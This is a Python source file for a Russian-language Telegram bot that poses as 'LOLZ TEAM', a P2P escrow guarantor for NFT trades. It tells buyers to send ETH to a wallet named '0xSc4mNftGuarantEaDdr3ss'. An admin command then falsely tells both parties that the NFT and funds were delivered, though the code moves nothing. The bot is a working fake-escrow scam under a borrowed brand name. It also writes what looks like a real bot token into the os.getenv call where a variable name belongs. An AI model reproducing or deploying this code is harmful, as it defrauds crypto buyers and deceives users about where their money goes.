import asyncio
import logging
import os
from dotenv import load_dotenv # type: ignore

load_dotenv()                     # загружает переменные из .env
BOT_TOKEN = os.getenv("8579678219:AAHDuR-_YARDzp2Dt1SVs-Wml8JkbK-8-E0")  # читает токен из переменной окружения
from datetime import datetime
from typing import Dict

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telegram.error import TimedOut, NetworkError, RetryAfter
from telegram.request import HTTPXRequest

# ---------- КОНФИГ ----------
BOT_TOKEN = "ВАШ_ТОКЕН"       # замените на токен от BotFather
ADMIN_ID = 7846137037                 # ваш Telegram ID
BOT_USERNAME = "AutiTrade_support"      # юзернейм бота (без @)
# ----------------------------

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

deals: Dict[str, dict] = {}

def generate_deal_id() -> str:
    return f"deal_{datetime.now().strftime('%Y%m%d%H%M%S')}_{len(deals)+1}"

async def safe_send(bot, chat_id: int, text: str, **kwargs):
    for attempt in range(3):
        try:
            await bot.send_message(chat_id=chat_id, text=text, **kwargs)
            return
        except (TimedOut, NetworkError) as e:
            logger.warning(f"Попытка {attempt+1} не удалась: {e}")
            if attempt == 2:
                logger.error(f"Не удалось отправить сообщение {chat_id}")
            else:
                await asyncio.sleep(2 ** attempt)
        except RetryAfter as e:
            logger.warning(f"Флуд-контроль: ждём {e.retry_after} сек")
            await asyncio.sleep(e.retry_after)
        except Exception as e:
            logger.error(f"Ошибка отправки: {e}")
            break

# ---------- ГЛАВНОЕ МЕНЮ ----------
def main_menu():
    keyboard = [
        [InlineKeyboardButton("➕ Создать сделку", callback_data="new_deal")],
        [InlineKeyboardButton("💳 Реквизиты", callback_data="requisites")],
        [InlineKeyboardButton("🆘 Поддержка", callback_data="support")]
    ]
    return InlineKeyboardMarkup(keyboard)

def back_to_main():
    return InlineKeyboardMarkup([[InlineKeyboardButton("◀️ Главное меню", callback_data="back_main")]])

# ---------- ХЕНДЛЕРЫ ----------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработка /start и deep linking"""
    if context.args and context.args[0].startswith("deal_"):
        deal_id = context.args[0]
        await join_deal(update, context, deal_id)
        return

    text = (
        "🤝 *Добро пожаловать в LOLZ TEAM – надежный P2P-гарант*\n\n"
        "💼 *Покупайте и продавайте всё, что угодно – безопасно!*\n\n"
        "🔹 *Управление кошельками*\n"
        "🔹 *Сделки*\n"
        "🔹 *Поддержка*\n\n"
        "Выберите нужный раздел ниже:"
    )
    await safe_send(context.bot, update.effective_chat.id, text, parse_mode="Markdown", reply_markup=main_menu())

async def join_deal(update: Update, context: ContextTypes.DEFAULT_TYPE, deal_id: str):
    """Присоединение к сделке по ссылке"""
    user = update.effective_user.id
    deal = deals.get(deal_id)
    if not deal or deal["status"] != "active":
        await safe_send(context.bot, update.effective_chat.id, "❌ Сделка не активна или не существует.")
        return
    if user == deal["user1"]:
        await safe_send(context.bot, update.effective_chat.id, "❌ Это ваша сделка, вы не можете присоединиться к ней повторно.")
        return
    if deal["user2"] is not None:
        await safe_send(context.bot, update.effective_chat.id, "❌ К этой сделке уже присоединились.")
        return

    deal["user2"] = user
    deal["step"] = "waiting_nft"

    await safe_send(context.bot, deal["user1"],
        f"🔔 К сделке #{deal_id} присоединился {user}.\n"
        "Отправьте мне адрес коллекции и ID токена NFT через пробел.\n"
        "Пример: `0x123... 42`", parse_mode="Markdown")
    await safe_send(context.bot, user,
        f"✅ Вы присоединились к сделке #{deal_id}. Ожидайте данных от продавца.")

async def new_deal(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Создание новой сделки"""
    user = update.effective_user.id
    deal_id = generate_deal_id()
    deals[deal_id] = {
        "user1": user,
        "user2": None,
        "step": "waiting_second",
        "nft": None,
        "price": None,
        "status": "active"
    }
    invite_link = f"https://t.me/{BOT_USERNAME}?start={deal_id}"
    await safe_send(context.bot, update.effective_chat.id,
        f"✅ Сделка #{deal_id} создана!\n\n"
        f"📎 *Ссылка для покупателя:*\n{invite_link}\n\n"
        "Как только покупатель перейдёт по ссылке, я запрошу данные NFT.",
        parse_mode="Markdown", reply_markup=back_to_main())

async def requisites(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Показать реквизиты для оплаты"""
    text = (
        "💳 *Реквизиты для оплаты*\n\n"
        "Для перевода средств используйте этот адрес:\n"
        "`0xSc4mNftGuarantEaDdr3ss`\n\n"
        "⚠️ Комиссия сервиса: 1%.\n"
        "После получения средств сделка будет завершена автоматически."
    )
    await safe_send(context.bot, update.effective_chat.id, text, parse_mode="Markdown", reply_markup=back_to_main())

async def support(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Показать контакты поддержки"""
    text = (
        "🆘 *Поддержка*\n\n"
        "Если у вас возникли вопросы или проблемы, свяжитесь с нами:\n"
        "📧 support@lolzteam.com\n"
        "👤 @AutiTrade_support\n\n"
        "Мы ответим в течение 24 часов."
    )
    await safe_send(context.bot, update.effective_chat.id, text, parse_mode="Markdown", reply_markup=back_to_main())

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработка нажатий кнопок"""
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == "back_main":
        await start(update, context)
        await query.message.delete()
        return

    elif data == "new_deal":
        await new_deal(update, context)
        await query.message.delete()

    elif data == "requisites":
        await requisites(update, context)
        await query.message.delete()

    elif data == "support":
        await support(update, context)
        await query.message.delete()

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработка текстовых сообщений (данные NFT, цена)"""
    user = update.effective_user.id
    text = update.message.text

    # Найти активную сделку для этого пользователя
    my_deal = None
    for did, d in deals.items():
        if d["status"] == "active" and (user == d["user1"] or user == d["user2"]):
            my_deal = d
            my_deal["id"] = did
            break
    if not my_deal:
        await safe_send(context.bot, update.effective_chat.id, "❗ Нет активных сделок. Используйте /start для создания новой.")
        return

    is_seller = (user == my_deal["user1"])

    if my_deal["step"] == "waiting_nft":
        if not is_seller:
            await safe_send(context.bot, update.effective_chat.id, "⏳ Продавец ещё не указал NFT.")
            return
        parts = text.split()
        if len(parts) != 2:
            await safe_send(context.bot, update.effective_chat.id,
                "📝 Формат: `<адрес_коллекции> <id_токена>`", parse_mode="Markdown")
            return
        my_deal["nft"] = parts
        my_deal["step"] = "waiting_price"
        await safe_send(context.bot, update.effective_chat.id,
            "✅ NFT принят. Теперь укажите сумму в ETH (числом).")

    elif my_deal["step"] == "waiting_price":
        if not is_seller:
            await safe_send(context.bot, update.effective_chat.id, "⏳ Продавец устанавливает цену.")
            return
        try:
            price = float(text)
            if price <= 0:
                raise ValueError
        except ValueError:
            await safe_send(context.bot, update.effective_chat.id, "❗ Введите положительное число, например 0.5")
            return
        my_deal["price"] = price
        my_deal["step"] = "waiting_payment"

        buyer = my_deal["user2"]
        await safe_send(context.bot, buyer,
            f"💰 *Сделка #{my_deal['id']}*\n\n"
            f"NFT: `{my_deal['nft'][0]}` #{my_deal['nft'][1]}\n"
            f"Сумма: {price} ETH (включая комиссию 1%)\n\n"
            f"Для завершения отправьте {price} ETH на адрес:\n"
            f"`0xSc4mNftGuarantEaDdr3ss`\n\n"
            f"После получения я переведу NFT продавцу, а вам — средства за вычетом комиссии.",
            parse_mode="Markdown"
        )
        await safe_send(context.bot, update.effective_chat.id,
            f"✅ Сумма {price} ETH зафиксирована. Покупателю отправлена инструкция по оплате.",
            reply_markup=back_to_main())

    else:
        await safe_send(context.bot, update.effective_chat.id, "⏳ Ожидайте, обрабатывается текущий этап.")

async def confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Админ-команда для завершения сделки"""
    if update.effective_user.id != ADMIN_ID:
        await safe_send(context.bot, update.effective_chat.id, "⛔ Недостаточно прав.")
        return
    args = context.args
    if not args:
        await safe_send(context.bot, update.effective_chat.id, "Использование: /confirm deal_xxx")
        return
    deal_id = args[0]
    deal = deals.get(deal_id)
    if not deal or deal["status"] != "active":
        await safe_send(context.bot, update.effective_chat.id, "Сделка не найдена или неактивна.")
        return
    if deal["step"] != "waiting_payment":
        await safe_send(context.bot, update.effective_chat.id, "Сделка не готова к подтверждению.")
        return

    deal["status"] = "completed"
    for uid in [deal["user1"], deal["user2"]]:
        await safe_send(context.bot, uid,
            f"✅ *Сделка #{deal_id} завершена!*\n\n"
            f"NFT передан продавцу, средства получены.\nСпасибо за использование LOLZ TEAM.",
            parse_mode="Markdown")
    await safe_send(context.bot, update.effective_chat.id, f"Сделка {deal_id} завершена.")

# ---------- ЗАПУСК ----------
async def main_loop():
    request = HTTPXRequest(
        connect_timeout=60.0,
        read_timeout=300.0,
        write_timeout=60.0,
        pool_timeout=60.0,
        connection_pool_size=20,
    )

    app = Application.builder() \
        .token(BOT_TOKEN) \
        .request(request) \
        .build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(CommandHandler("confirm", confirm))

    while True:
        try:
            logger.info("Бот запущен, ожидаем сообщения...")
            await app.initialize()
            await app.start()
            await app.updater.start_polling()
            while True:
                await asyncio.sleep(3600)
        except (TimedOut, NetworkError) as e:
            logger.error(f"Сетевая ошибка: {e}. Перезапуск через 10 сек...")
            await asyncio.sleep(10)
        except Exception as e:
            logger.exception(f"Критическая ошибка: {e}. Перезапуск через 30 сек...")
            await asyncio.sleep(30)
        finally:
            try:
                if app.updater.running:
                    await app.stop()
                if app.running:
                    await app.shutdown()
            except Exception as e:
                logger.error(f"Ошибка при остановке: {e}")

if __name__ == "__main__":
    asyncio.run(main_loop())